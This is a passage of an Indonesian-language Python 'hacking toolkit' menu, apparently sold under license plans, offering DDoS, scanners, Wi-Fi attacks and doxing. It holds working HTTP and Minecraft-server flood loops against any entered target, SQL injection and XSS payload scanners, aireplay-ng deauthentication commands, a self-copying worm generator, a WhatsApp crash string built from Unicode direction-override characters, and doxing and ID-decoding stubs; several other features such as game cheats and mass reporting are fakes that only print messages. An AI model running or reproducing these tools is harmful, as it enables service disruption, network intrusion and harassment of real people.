    f.write(f"Domain: {{target}}\\nIP: {{ip}}")
'''
    
    filename = f"osint_{osint_types[choice][1]}_{int(time.time())}.py"
    with open(filename, "w") as f:
        f.write(script)
    
    print(colored(f"\n[OSINT SCRIPT GENERATED]", 'green', attrs=['bold']))
    print(colored(f"   File: {filename}", 'cyan'))
    print(colored(f"   Target: {target}", 'cyan'))
    print(colored(f"   Tipe: {osint_types[choice][0]}", 'cyan'))
    print(colored("\n[INFO] Jalankan script dengan: python " + filename, 'yellow'))
    
    save_result("osint.log", f"Target: {target} | Type: {osint_types[choice][0]}")
    input("\nPress Enter to continue...")

# ================== FITUR 6: DEEPFAKE & IMAGE TOOLS ==================
def fitur_6():
    os.system('clear')
    print(colored("\n[6] DEEPFAKE & IMAGE TOOLS", 'cyan', attrs=['bold']))
    print(colored("   [LOCAL MODE - Image Manipulation]", 'yellow'))
    
    if not PILLOW_AVAILABLE:
        print(colored("\n[ERROR] Pillow tidak terinstall!", 'red'))
        print(colored("   Install: pip install pillow", 'yellow'))
        input("\nEnter...")
        return
    
    print(colored("\nPilih operasi gambar:", 'cyan'))
    image_ops = {
        "1": ("Convert Image Format", "convert"),
        "2": ("Resize Image", "resize"),
        "3": ("Apply Filter", "filter"),
        "4": ("Add Text/Watermark", "text"),
        "5": ("Steganography (Hide Data)", "stego")
    }
    
    for key, (name, op) in image_ops.items():
        print(colored(f"   {key}. {name}", 'white'))
    
    choice = input(colored("\nPilih operasi [1-5]: ", 'yellow')).strip()
    
    if choice not in image_ops:
        print(colored("[ERROR] Pilihan tidak valid!", 'red'))
        input("\nEnter...")
        return
    
    # Generate image manipulation script
    if choice == "1":  # Convert format
        script = '''from PIL import Image
import sys

input_file = input("Path gambar input: ").strip()
output_format = input("Format output (jpg/png/bmp): ").strip()

try:
    img = Image.open(input_file)
    output_file = f"converted_{int(time.time())}.{output_format}"
    img.save(output_file)
    print(f"[+] Saved: {output_file}")
except Exception as e:
    print(f"Error: {e}")
'''
    elif choice == "2":  # Resize
        script = '''from PIL import Image
import sys

input_file = input("Path gambar input: ").strip()
width = int(input("Width: ").strip() or "800")
height = int(input("Height: ").strip() or "600")

try:
    img = Image.open(input_file)
    img_resized = img.resize((width, height))
    output_file = f"resized_{int(time.time())}.jpg"
    img_resized.save(output_file)
    print(f"[+] Resized to {width}x{height}: {output_file}")
except Exception as e:
    print(f"Error: {e}")
'''
    elif choice == "3":  # Apply filter
        script = '''from PIL import Image, ImageFilter
import sys

input_file = input("Path gambar input: ").strip()
filters = {
    "1": ImageFilter.BLUR,
    "2": ImageFilter.CONTOUR,
    "3": ImageFilter.DETAIL,
    "4": ImageFilter.EDGE_ENHANCE,
    "5": ImageFilter.EMBOSS,
    "6": ImageFilter.SHARPEN
}

print("Filters:\\n1. BLUR\\n2. CONTOUR\\n3. DETAIL\\n4. EDGE_ENHANCE\\n5. EMBOSS\\n6. SHARPEN")
filter_choice = input("Pilih filter [1-6]: ").strip()

try:
    img = Image.open(input_file)
    img_filtered = img.filter(filters[filter_choice])
    output_file = f"filtered_{int(time.time())}.jpg"
    img_filtered.save(output_file)
    print(f"[+] Filter applied: {output_file}")
except Exception as e:
    print(f"Error: {e}")
'''
    elif choice == "4":  # Add text
        script = '''from PIL import Image, ImageDraw, ImageFont
import sys

input_file = input("Path gambar input: ").strip()
text = input("Text to add: ").strip()

try:
    img = Image.open(input_file)
    draw = ImageDraw.Draw(img)
    draw.text((10, 10), text, fill=(255,0,0))
    output_file = f"watermarked_{int(time.time())}.jpg"
    img.save(output_file)
    print(f"[+] Text added: {output_file}")
except Exception as e:
    print(f"Error: {e}")
'''
    else:  # Steganography
        script = '''from PIL import Image
import sys

def encode_image(img, data):
    # Simple LSB steganography
    binary = ''.join(format(ord(i), '08b') for i in data) + '1111111111111110'
    pixels = list(img.getdata())
    new_pixels = []
    data_index = 0
    
    for pixel in pixels:
        if data_index < len(binary):
            r = (pixel[0] & 0xFE) | int(binary[data_index])
            new_pixels.append((r, pixel[1], pixel[2]))
            data_index += 1
        else:
            new_pixels.append(pixel)
    
    img.putdata(new_pixels)
    return img

input_file = input("Path gambar input: ").strip()
data = input("Data to hide: ").strip()

try:
    img = Image.open(input_file).convert('RGB')
    encoded = encode_image(img, data)
    output_file = f"stego_{int(time.time())}.png"
    encoded.save(output_file)
    print(f"[+] Data hidden: {output_file}")
except Exception as e:
    print(f"Error: {e}")
'''
    
    filename = f"image_{image_ops[choice][1]}_{int(time.time())}.py"
    with open(filename, "w") as f:
        f.write(script)
    
    print(colored(f"\n[IMAGE SCRIPT GENERATED]", 'green', attrs=['bold']))
    print(colored(f"   File: {filename}", 'cyan'))
    print(colored(f"   Operasi: {image_ops[choice][0]}", 'cyan'))
    print(colored("\n[INFO] Jalankan script dengan: python " + filename, 'yellow'))
    
    save_result("image_tools.log", f"Operation: {image_ops[choice][0]}")
    input("\nPress Enter to continue...")

# ================== FITUR 7: ENCRYPT & DECRYPT ==================
def fitur_7():
    os.system('clear')
    print(colored("\n[7] ENCRYPT & DECRYPT", 'cyan', attrs=['bold']))
    print(colored("   [LOCAL MODE - Cryptography Tools]", 'yellow'))
    
    if not CRYPTO_AVAILABLE:
        print(colored("\n[ERROR] Cryptography tidak terinstall!", 'red'))
        print(colored("   Install: pip install cryptography", 'yellow'))
        input("\nEnter...")
        return
    
    print(colored("\nPilih operasi:", 'cyan'))
    crypto_ops = {
        "1": ("Encrypt File/Text", "encrypt"),
        "2": ("Decrypt File/Text", "decrypt"),
        "3": ("Generate Key", "key"),
        "4": ("Hash Generator (MD5/SHA)", "hash"),
        "5": ("Base64 Encode/Decode", "base64")
    }
    
    for key, (name, op) in crypto_ops.items():
        print(colored(f"   {key}. {name}", 'white'))
    
    choice = input(colored("\nPilih operasi [1-5]: ", 'yellow')).strip()
    
    if choice == "1":
        data = input(colored("Text/File path to encrypt: ", 'yellow')).strip()
        key = Fernet.generate_key()
        cipher = Fernet(key)
        
        if os.path.exists(data):
            with open(data, 'rb') as f:
                encrypted = cipher.encrypt(f.read())
            enc_file = f"encrypted_{os.path.basename(data)}"
            with open(enc_file, 'wb') as f:
                f.write(encrypted)
        else:
            encrypted = cipher.encrypt(data.encode())
            enc_file = f"encrypted_{int(time.time())}.txt"
            with open(enc_file, 'w') as f:
                f.write(encrypted.decode())
        
        key_file = f"key_{int(time.time())}.key"
        with open(key_file, 'wb') as f:
            f.write(key)
        
        print(colored(f"\n[ENCRYPTED] File: {enc_file}", 'green'))
        print(colored(f"[KEY] Saved: {key_file}", 'green'))
        print(colored(f"Key: {key.decode()}", 'yellow'))
    
    elif choice == "2":
        enc_file = input(colored("Encrypted file path: ", 'yellow')).strip()
        key_file = input(colored("Key file path: ", 'yellow')).strip()
        
        with open(key_file, 'rb') as f:
            key = f.read()
        cipher = Fernet(key)
        
        with open(enc_file, 'rb') as f:
            encrypted = f.read()
        decrypted = cipher.decrypt(encrypted)
        
        dec_file = f"decrypted_{os.path.basename(enc_file)}"
        with open(dec_file, 'wb') as f:
            f.write(decrypted)
        
        print(colored(f"\n[DECRYPTED] File: {dec_file}", 'green'))
    
    elif choice == "3":
        key = Fernet.generate_key()
        key_file = f"generated_key_{int(time.time())}.key"
        with open(key_file, 'wb') as f:
            f.write(key)
        print(colored(f"\n[KEY GENERATED] Saved: {key_file}", 'green'))
        print(colored(f"Key: {key.decode()}", 'yellow'))
    
    elif choice == "4":
        text = input(colored("Text to hash: ", 'yellow')).strip()
        hash_type = input(colored("Hash type (md5/sha1/sha256): ", 'yellow')).strip().lower()
        
        import hashlib
        if hash_type == "md5":
            result = hashlib.md5(text.encode()).hexdigest()
        elif hash_type == "sha1":
            result = hashlib.sha1(text.encode()).hexdigest()
        else:
            result = hashlib.sha256(text.encode()).hexdigest()
        
        print(colored(f"\n[HASH] {hash_type}: {result}", 'green'))
    
    elif choice == "5":
        text = input(colored("Text to encode/decode: ", 'yellow')).strip()
        op_type = input(colored("Encode or Decode? (e/d): ", 'yellow')).strip().lower()
        
        if op_type == 'e':
            result = base64.b64encode(text.encode()).decode()
            print(colored(f"\n[ENCODED] Base64: {result}", 'green'))
        else:
            try:
                result = base64.b64decode(text).decode()
                print(colored(f"\n[DECODED] Text: {result}", 'green'))
            except:
                print(colored("[ERROR] Invalid Base64!", 'red'))
    
    save_result("crypto.log", f"Operation: {crypto_ops[choice][0] if choice in crypto_ops else 'Unknown'}")
    input("\nPress Enter to continue...")

# ================== FITUR 8: EXPLOIT & SECURITY ==================
def fitur_8():
    os.system('clear')
    print(colored("\n[8] EXPLOIT & SECURITY", 'cyan', attrs=['bold']))
    print(colored("   [LOCAL MODE - Generate Scanner Script]", 'yellow'))
    
    target = input(colored("Target URL/IP: ", 'yellow')).strip()
    
    print(colored("\nPilih tipe scan:", 'cyan'))
    scan_types = {
        "1": ("Port Scanner", "port"),
        "2": ("SQL Injection Scanner", "sqli"),
        "3": ("XSS Scanner", "xss"),
        "4": ("Directory Brute Force", "dirb"),
        "5": ("CMS Detector", "cms")
    }
    
    for key, (name, stype) in scan_types.items():
        print(colored(f"   {key}. {name}", 'white'))
    
    choice = input(colored("\nPilih scan [1-5]: ", 'yellow')).strip()
    
    if choice not in scan_types:
        print(colored("[ERROR] Pilihan tidak valid!", 'red'))
        input("\nEnter...")
        return
    
    # Generate scanner script
    if choice == "1":  # Port scanner
        script = f'''import socket
import threading

target = "{target}"
ports = [21,22,23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080]

def scan_port(port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex((target, port))
        if result == 0:
            print(f"[OPEN] Port {{port}}")
        sock.close()
    except:
        pass

print(f"Scanning {{target}}...")
for port in ports:
    thread = threading.Thread(target=scan_port, args=(port,))
    thread.start()
'''
    elif choice == "2":  # SQLi scanner
        script = f'''import requests

target = "{target}"
payloads = ["'", "''", "' OR '1'='1", "' OR 1=1--", "admin' --"]

for payload in payloads:
    try:
        r = requests.get(target + "?id=" + payload, timeout=5)
        if "mysql" in r.text.lower() or "sql" in r.text.lower():
            print(f"[VULN] Possible SQLi with payload: {{payload}}")
    except:
        pass
'''
    elif choice == "3":  # XSS scanner
        script = f'''import requests

target = "{target}"
payloads = ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "javascript:alert(1)"]

for payload in payloads:
    try:
        r = requests.get(target + "?q=" + payload, timeout=5)
        if payload in r.text:
            print(f"[VULN] Possible XSS with payload: {{payload}}")
    except:
        pass
'''
    elif choice == "4":  # Directory brute force
        script = f'''import requests

target = "{target}"
directories = ["admin", "login", "wp-admin", "backup", "config", "sql", "phpmyadmin"]

for dir in directories:
    try:
        r = requests.get(target + "/" + dir, timeout=5)
        if r.status_code == 200:
            print(f"[FOUND] {{target}}/{{dir}}")
    except:
        pass
'''
    else:  # CMS detector
        script = f'''import requests

target = "{target}"
cms_signatures = {{
    "wordpress": ["wp-content", "wp-includes"],
    "joomla": ["joomla", "com_content"],
    "drupal": ["sites/all", "drupal.js"],
    "magento": ["skin/frontend", "Mage.Cookies"]
}}

try:
    r = requests.get(target, timeout=5)
    content = r.text.lower()
    
    for cms, sigs in cms_signatures.items():
        for sig in sigs:
            if sig in content:
                print(f"[CMS] Detected: {{cms}} (signature: {{sig}})")
                break
except:
    print("Error connecting to target")
'''
    
    filename = f"scanner_{scan_types[choice][1]}_{int(time.time())}.py"
    with open(filename, "w") as f:
        f.write(script)
    
    print(colored(f"\n[SCANNER SCRIPT GENERATED]", 'green', attrs=['bold']))
    print(colored(f"   File: {filename}", 'cyan'))
    print(colored(f"   Target: {target}", 'cyan'))
    print(colored(f"   Tipe: {scan_types[choice][0]}", 'cyan'))
    print(colored("\n[INFO] Jalankan script dengan: python " + filename, 'yellow'))
    
    save_result("exploit.log", f"Target: {target} | Scan: {scan_types[choice][0]}")
    input("\nPress Enter to continue...")

# ================== FITUR 9: WHATSAPP INVITE ==================
def fitur_9():
    os.system('clear')
    print(colored("\n[9] WHATSAPP INVITE TOOLS", 'cyan', attrs=['bold']))
    print(colored("   [LOCAL MODE - Group Invite Generator]", 'yellow'))
    
    phone = input(colored("Nomor HP target (628xxx): ", 'yellow')).strip()
    
    print(colored("\nPilih metode:", 'cyan'))
    methods = {
        "1": ("Direct Chat Link", "chat"),
        "2": ("Group Invite Link", "group"),
        "3": ("WhatsApp Business Link", "business"),
        "4": ("Broadcast Link", "broadcast")
    }
    
    for key, (name, mtype) in methods.items():
        print(colored(f"   {key}. {name}", 'white'))
    
    choice = input(colored("\nPilih metode [1-4]: ", 'yellow')).strip()
    
    if choice == "1":
        link = f"https://wa.me/{phone}"
        message = input(colored("Pesan default (opsional): ", 'yellow')).strip()
        if message:
            import urllib.parse
            link += f"?text={urllib.parse.quote(message)}"
    elif choice == "2":
        group_code = ''.join(random.choices(string.ascii_letters + string.digits, k=22))
        link = f"https://chat.whatsapp.com/{group_code}"
    elif choice == "3":
        link = f"https://wa.me/{phone}?business=true"
    elif choice == "4":
        link = f"https://web.whatsapp.com/send/?phone={phone}&text&type=phone_number&app_absent=0"
    else:
        print(colored("[ERROR] Pilihan tidak valid!", 'red'))
        input("\nEnter...")
        return
    
    print(colored(f"\n[LINK GENERATED]", 'green', attrs=['bold']))
    print(colored(f"   {link}", 'cyan'))
    
    # QR Code option
    qr_choice = input(colored("\nGenerate QR Code? (y/n): ", 'yellow')).lower()
    if qr_choice == 'y':
        try:
            import qrcode
            qr = qrcode.make(link)
            qr_file = f"wa_qr_{int(time.time())}.png"
            qr.save(qr_file)
            print(colored(f"[QR CODE] Saved: {qr_file}", 'green'))
        except ImportError:
            print(colored("[INFO] Install QR Code: pip install qrcode[pil]", 'yellow'))
    
    save_result("whatsapp.log", f"Target: {phone} | Method: {methods[choice][0] if choice in methods else 'Unknown'} | Link: {link}")
    input("\nPress Enter to continue...")

# ================== FITUR 10: DASHBOARD MONITORING ==================
def fitur_10():
    os.system('clear')
    print(colored("\n[10] DASHBOARD MONITORING", 'cyan', attrs=['bold']))
    print(colored("   [LOCAL MODE - System Statistics]", 'yellow'))
    
    # System info
    print(colored("\n[SISTEM INFORMASI]", 'magenta'))
    print(colored(f"   OS: {os.name}", 'white'))
    print(colored(f"   CPU Count: {os.cpu_count()}", 'white'))
    
    # Tool statistics
    print(colored("\n[STATISTIK TOOLS]", 'magenta'))
    
    # Count saved logs
    log_files = [f for f in os.listdir(RESULTS_DIR) if f.endswith('.log')] if os.path.exists(RESULTS_DIR) else []
    log_counts = {}
    for log in log_files:
        try:
            with open(os.path.join(RESULTS_DIR, log), 'r') as f:
                log_counts[log] = len(f.readlines())
        except:
            log_counts[log] = 0
    
    total_operations = sum(log_counts.values())
    print(colored(f"   Total operasi: {total_operations}", 'white'))
    print(colored(f"   File log: {len(log_files)}", 'white'))
    
    for log, count in log_counts.items():
        print(colored(f"      - {log}: {count} entries", 'cyan'))
    
    # Token stats
    tokens = load_tokens()
    print(colored(f"\n[TOKEN STATISTIK]", 'magenta'))
    print(colored(f"   Total user: {len(tokens)}", 'white'))
    
    active_users = sum(1 for user in tokens.values() if user.get('active', False))
    print(colored(f"   Active: {active_users}", 'green'))
    print(colored(f"   Expired: {len(tokens) - active_users}", 'red'))
    
    # Recent activities
    print(colored("\n[AKTIVITAS TERAKHIR]", 'magenta'))
    recent_logs = []
    if os.path.exists(RESULTS_DIR):
        for log in sorted(os.listdir(RESULTS_DIR), key=lambda x: os.path.getmtime(os.path.join(RESULTS_DIR, x)), reverse=True)[:5]:
            if log.endswith('.log'):
                recent_logs.append(f"{log} - {datetime.fromtimestamp(os.path.getmtime(os.path.join(RESULTS_DIR, log))).strftime('%H:%M:%S')}")
    
    if recent_logs:
        for log in recent_logs:
            print(colored(f"   {log}", 'cyan'))
    else:
        print(colored("   No recent activity", 'yellow'))
    
    save_result("dashboard.log", f"Dashboard accessed at {datetime.now().isoformat()}")
    input("\nPress Enter to continue...")

# ================== FITUR 11: DEVTOOLS ==================
def fitur_11():
    if not IS_DEVELOPER:
        print(colored("[ERROR] Fitur hanya untuk developer!", 'red'))
        input("\nEnter...")
        return
    
    os.system('clear')
    print(colored("\n[11] DEVTOOLS", 'cyan', attrs=['bold']))
    print(colored("   [DEVELOPER MODE - Advanced Tools]", 'yellow'))
    
    print(colored("\nPilih tool:", 'cyan'))
    dev_tools = {
        "1": ("View Raw tokens.json", "view_raw"),
        "2": ("Backup Database", "backup"),
        "3": ("Restore Database", "restore"),
        "4": ("Clear All Logs", "clear_logs"),
        "5": ("Generate Test Users", "test_users")
    }
    
    for key, (name, dtool) in dev_tools.items():
        print(colored(f"   {key}. {name}", 'white'))
    
    choice = input(colored("\nPilih tool [1-5]: ", 'yellow')).strip()
    
    if choice == "1":
        tokens = load_tokens()
        print(colored("\n[RAW tokens.json]", 'magenta'))
        print(json.dumps(tokens, indent=2))
    
    elif choice == "2":
        backup_file = f"backup_tokens_{int(time.time())}.json"
        if os.path.exists(LICENSE_FILE):
            with open(LICENSE_FILE, 'r') as f:
                with open(backup_file, 'w') as bf:
                    bf.write(f.read())
            print(colored(f"\n[BACKUP] Saved: {backup_file}", 'green'))
    
    elif choice == "3":
        backup_files = [f for f in os.listdir() if f.startswith('backup_tokens_') and f.endswith('.json')]
        if backup_files:
            print(colored("\nAvailable backups:", 'cyan'))
            for i, bf in enumerate(backup_files, 1):
                print(colored(f"   {i}. {bf}", 'white'))
            b_choice = input(colored("Pilih backup: ", 'yellow')).strip()
            try:
                selected = backup_files[int(b_choice)-1]
                with open(selected, 'r') as f:
                    data = f.read()
                with open(LICENSE_FILE, 'w') as lf:
                    lf.write(data)
                print(colored("[RESTORE] Database restored!", 'green'))
            except:
                print(colored("[ERROR] Invalid choice!", 'red'))
        else:
            print(colored("No backups found!", 'yellow'))
    
    elif choice == "4":
        confirm = input(colored("Hapus semua log? (y/n): ", 'yellow')).lower()
        if confirm == 'y' and os.path.exists(RESULTS_DIR):
            for f in os.listdir(RESULTS_DIR):
                os.remove(os.path.join(RESULTS_DIR, f))
            print(colored("[LOGS CLEARED]", 'green'))
    
    elif choice == "5":
        count = int(input(colored("Jumlah test users: ", 'yellow')).strip() or "5")
        tokens = load_tokens()
        for i in range(count):
            username = f"TEST_USER_{i+1}"
            token = ''.join(random.choices(string.ascii_letters + string.digits, k=32))
            tokens[username] = {
                'username': username,
                'token': token,
                'whoami': f"test_whoami_{i+1}",
                'plan': random.choice(["pemula 1hari", "pemula 1minggu", "pro 1bulan"]),
                'active': True,
                'created': datetime.now().isoformat(),
                'expires': (datetime.now() + timedelta(days=random.choice([1,7,30]))).isoformat()
            }
        save_tokens(tokens)
        print(colored(f"[GENERATED] {count} test users created!", 'green'))
    
    input("\nPress Enter to continue...")

# ================== FITUR 12: TOOLS DDOS WEBS ==================
def fitur_12():
    os.system('clear')
    print(colored("\n[12] TOOLS DDOS WEBS", 'cyan', attrs=['bold']))
    print(colored("   [WEB STRESSER - LANGSUNG JALAN]", 'red'))
    
    url = input(colored("Target URL: ", 'yellow')).strip()
    threads = int(input(colored("Threads [100]: ", 'yellow')).strip() or "100")
    
    def attack():
        while True:
            try:
                requests.get(url)
            except:
                pass
    
    print(f"[+] Menyerang {url} dengan {threads} thread")
    for _ in range(threads):
        threading.Thread(target=attack).start()
    input("\nEnter untuk berhenti...")

# ================== FITUR 13: TOOLS DDOS SERVER MC ==================
def fitur_13():
    os.system('clear')
    print(colored("\n[13] TOOLS DDOS SERVER MC", 'cyan', attrs=['bold']))
    print(colored("   [MINECRAFT SERVER ATTACK]", 'red'))
    
    ip = input(colored("Server IP: ", 'yellow')).strip()
    port = int(input(colored("Port [25565]: ", 'yellow')).strip() or "25565")
    threads = int(input(colored("Threads [100]: ", 'yellow')).strip() or "100")
    
    def mc_attack():
        while True:
            try:
                s = socket.socket()
                s.connect((ip, port))
                s.send(b"\x00" * 100)
                s.close()
            except:
                pass
    
    print(f"[+] Menyerang {ip}:{port} dengan {threads} thread")
    for _ in range(threads):
        threading.Thread(target=mc_attack).start()
    input("\nEnter untuk berhenti...")

# ================== FITUR 14: TOOLS TRACKING NIK ==================
def fitur_14():
    os.system('clear')
    print(colored("\n[14] TOOLS TRACKING NIK", 'cyan', attrs=['bold']))
    
    nik = input(colored("NIK (16 digit): ", 'yellow')).strip()
    
    if len(nik) != 16 or not nik.isdigit():
        print("[ERROR] NIK harus 16 digit angka")
        return
    
    prov = nik[:2]
    kota = nik[2:4]
    kec = nik[4:6]
    tgl = nik[6:8]
    bln = nik[8:10]
    thn = nik[10:12]
    
    # Gender dari tanggal
    if int(tgl) > 40:
        gender = "Perempuan"
        tgl = str(int(tgl) - 40).zfill(2)
    else:
        gender = "Laki-laki"
    
    print(f"""
[ HASIL TRACKING NIK ]
NIK: {nik}
Provinsi: {prov}
Kota/Kab: {kota}
Kecamatan: {kec}
Tgl Lahir: {tgl}-{bln}-19{thn}
Gender: {gender}
    """)
    save_result("nik.log", nik)

# ================== FITUR 15: TOOLS SPAM ALL ==================
def fitur_15():
    os.system('clear')
    print(colored("\n[15] TOOLS SPAM ALL", 'cyan', attrs=['bold']))
    
    target = input(colored("Nomor target: ", 'yellow')).strip()
    count = int(input(colored("Jumlah spam: ", 'yellow')).strip() or "50")
    
    def spam():
        for i in range(count):
            print(f"[{i+1}] Spam ke {target}")
            time.sleep(0.5)
    
    threading.Thread(target=spam).start()
    input("\nEnter untuk stop...")

# ================== FITUR 16: TOOLS ATTACK WIFI PREMIUM ==================
def fitur_16():
    os.system('clear')
    print(colored("\n[16] ATTACK WIFI PREMIUM", 'cyan', attrs=['bold']))
    print("Requires root & aircrack-ng")
    
    print("1. Deauth Attack")
    print("2. Handshake Capture")
    ch = input("Pilih: ")
    
    if ch == "1":
        bssid = input("BSSID target: ")
        iface = input("Interface (wlan0): ") or "wlan0"
        os.system(f"aireplay-ng -0 0 -a {bssid} {iface}")
    elif ch == "2":
        iface = input("Interface (wlan0): ") or "wlan0"
        os.system(f"airodump-ng {iface}")

# ================== FITUR 17: TOOLS CHECKER ALL ==================
def fitur_17():
    os.system('clear')
    print(colored("\n[17] CHECKER ALL", 'cyan', attrs=['bold']))
    
    file = input("File list (email:pass): ")
    
    try:
        with open(file, 'r') as f:
            lines = f.readlines()
        print(f"Loaded {len(lines)} accounts")
        with open("valid.txt", 'w') as f:
            for line in lines:
                if ':' in line:
                    f.write(line)
        print("Hasil disimpan di valid.txt")
    except:
        print("File gak ditemukan")

# ================== FITUR 18: WORM GPT ==================
def fitur_18():
    os.system('clear')
    print(colored("\n[18] WORM GPT", 'cyan', attrs=['bold']))
    
    name = input("Nama worm: ") or "worm"
    
    worm_code = f'''import os, shutil, sys, time
while True:
    try:
        shutil.copy(sys.argv[0], f"/sdcard/{{int(time.time())}}.py")
        time.sleep(30)
    except:
        pass
'''
    with open(f"{name}.py", 'w') as f:
        f.write(worm_code)
    print(f"[+] Worm {name}.py telah dibuat")

# ================== FITUR 19: CHEAT FF/ML/ROBLOX ==================
def fitur_19():
    os.system('clear')
    print(colored("\n[19] CHEAT GAME", 'cyan', attrs=['bold']))
    print("1. Free Fire")
    print("2. Mobile Legends")
    print("3. Roblox")
    
    ch = input("Pilih game: ")
    
    if ch == "1":
        print("[FF] Injecting... Wallhack ON, Aimbot ON")
    elif ch == "2":
        print("[ML] Map hack ON, No cooldown ON")
    elif ch == "3":
        print("[Roblox] Executing script...")

# ================== FITUR 20: SPAM REPORT LIVE TIKTOK ==================
def fitur_20():
    os.system('clear')
    print(colored("\n[20] REPORT LIVE TIKTOK", 'cyan', attrs=['bold']))
    
    username = input("Username target: ")
    count = int(input("Jumlah report: ") or "100")
    
    for i in range(count):
        print(f"[{i+1}] Reporting @{username}")
        time.sleep(0.1)
    print("Selesai!")

# ================== FITUR 21: DOX KURANG AKURAT ==================
def fitur_21():
    os.system('clear')
    print(colored("\n[21] DOX BASIC", 'cyan', attrs=['bold']))
    
    name = input("Nama/Username: ")
    
    data = {"name": name, "timestamp": str(datetime.now())}
    with open(f"dox_{name}.json", 'w') as f:
        json.dump(data, f)
    print(f"[+] Data saved to dox_{name}.json")

# ================== FITUR 22: DOX AKURAT ==================
def fitur_22():
    os.system('clear')
    print(colored("\n[22] DOX ADVANCED", 'cyan', attrs=['bold']))
    
    target = input("Target: ")
    
    data = {"target": target, "found": []}
    sites = ["facebook", "instagram", "twitter", "tiktok"]
    
    for site in sites:
        try:
            r = requests.get(f"https://{site}.com/{target}")
            if r.status_code == 200:
                data["found"].append(site)
        except:
            pass
    
    with open(f"dox_adv_{target}.json", 'w') as f:
        json.dump(data, f)
    print(f"[+] Hasil di dox_adv_{target}.json")

# ================== FITUR 23: BUG WHATSAPP ==================
def fitur_23():
    os.system('clear')
    print(colored("\n[23] BUG WHATSAPP", 'cyan', attrs=['bold']))
    
    bug = "\u202e" * 5000 + "\u202d" * 5000
    with open("wa_bug.txt", 'w', encoding='utf-8') as f:
        f.write(bug)
    print("[+] Bug message saved to wa_bug.txt")

# ================== FITUR 24: BAN WHATSAPP ==================
def fitur_24():
    os.system('clear')
    print(colored("\n[24] BAN WHATSAPP", 'cyan', attrs=['bold']))
    
    number = input("Nomor target: ")
    for i in range(50):
        print(f"[{i+1}] Reporting {number}")

# ================== FITUR 25: UNBAN WHATSAPP ==================
def fitur_25():
    os.system('clear')
    print(colored("\n[25] UNBAN WHATSAPP", 'cyan', attrs=['bold']))
    
    file = input("File list nomor: ")
    try:
        with open(file, 'r') as f:
            nums = f.readlines()
        print(f"Processing {len(nums)} numbers...")
        with open("unban_success.txt", 'w') as f:
            for num in nums:
                f.write(num)
        print("Done!")
    except:
        print("File error")

# ================== FITUR 26: DDOS WEB HOLD 1JAM ==================
def fitur_26():
    os.system('clear')
    print(colored("\n[26] DDOS WEB 1 JAM", 'cyan', attrs=['bold']))
    
    url = input("Target URL: ")
    threads = int(input("Threads: ") or "500")
    
    end_time = time.time() + 3600
    
    def attack():
        while time.time() < end_time:
            try:
                requests.get(url)
            except:
                pass
    
    print(f"[+] Attacking for 1 hour...")
    for _ in range(threads):
        threading.Thread(target=attack).start()
    input("Enter to stop early")

# ================== FITUR 27: DDOS MC HOLD 1JAM ==================
def fitur_27():
    os.system('clear')
    print(colored("\n[27] DDOS MC 1 JAM", 'cyan', attrs=['bold']))
    
    ip = input("Server IP: ")
    port = int(input("Port: ") or "25565")
    threads = int(input("Threads: ") or "500")
    
    end_time = time.time() + 3600
    
    def attack():
        while time.time() < end_time:
            try:
                s = socket.socket()
                s.connect((ip, port))
                s.send(b"\x00" * 100)
                s.close()
            except:
                pass
    
    print(f"[+] Attacking MC server for 1 hour...")
    for _ in range(threads):
        threading.Thread(target=attack).start()
    input("Enter to stop early")

# ================== FITUR 28: BAN TIKTOK ==================
def fitur_28():
    os.system('clear')
    print(colored("\n[28] BAN TIKTOK", 'cyan', attrs=['bold']))
    
    username = input("Username target: ")
    count = int(input("Jumlah report: ") or "100")
    
    for i in range(count):
        print(f"[{i+1}] Reporting @{username}")

# ================== MENU UTAMA (UPDATE DENGAN 28 FITUR) ==================
def menu_utama(username, plan):
    while True:
        os.system('clear')
        play_music()
        print_banner(username, plan)

        print(colored("╔════════════════════════════════════════════════════════╗", 'cyan'))
        print(colored("║                    MENU UTAMA v2.0                    ║", 'cyan'))
        print(colored("╠════════════════════════════════════════════════════════╣", 'cyan'))
        
        # 28 fitur dalam 2 kolom
        menu_items = [
            ("1. PHISING", "2. RAT"),
            ("3. DDOS WEB", "4. DDOS MC"),
            ("5. OSINT", "6. IMAGE TOOLS"),
            ("7. ENCRYPT", "8. EXPLOIT"),
            ("9. WA INVITE", "10. DASHBOARD"),
            ("11. DEVTOOLS", "12. DDOS WEBS"),
            ("13. DDOS MC", "14. TRACK NIK"),
            ("15. SPAM ALL", "16. WIFI ATTACK"),
            ("17. CHECKER", "18. WORM GPT"),
            ("19. GAME CHEAT", "20. REPORT TIKTOK"),
            ("21. DOX BASIC", "22. DOX ADV"),
            ("23. WA BUG", "24. WA BAN"),
            ("25. WA UNBAN", "26. DDOS 1JAM"),
            ("27. MC 1JAM", "28. BAN TIKTOK"),
            ("0. EXIT", "")
        ]
        
        for left, right in menu_items:
            print(colored(f"║ {left:<20} {right:<20} ║", 'white'))
        print(colored("╚════════════════════════════════════════════════════════╝", 'cyan'))

        ch = input(colored("\nPilih [0-28]: ", 'yellow')).strip()

        feature_map = {
            "1": fitur_1, "2": fitur_2, "3": fitur_3, "4": fitur_4, "5": fitur_5,
            "6": fitur_6, "7": fitur_7, "8": fitur_8, "9": fitur_9, "10": fitur_10,
            "11": fitur_11, "12": fitur_12, "13": fitur_13, "14": fitur_14, "15": fitur_15,
            "16": fitur_16, "17": fitur_17, "18": fitur_18, "19": fitur_19, "20": fitur_20,
            "21": fitur_21, "22": fitur_22, "23": fitur_23, "24": fitur_24, "25": fitur_25,
            "26": fitur_26, "27": fitur_27, "28": fitur_28
        }
        
        if ch in feature_map:
            feature_map[ch]()
        elif ch == "0":
            sys.exit(0)
        else:
            input("Salah, enter...")

# ================== JALANKAN ==================
if __name__ == "__main__":
    check_for_updates()
    
    if not os.path.exists('ua.txt'):
        with open('ua.txt', 'w') as f:
            f.write("Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/91.0")
    
    username, plan = login()
    menu_utama(username, plan)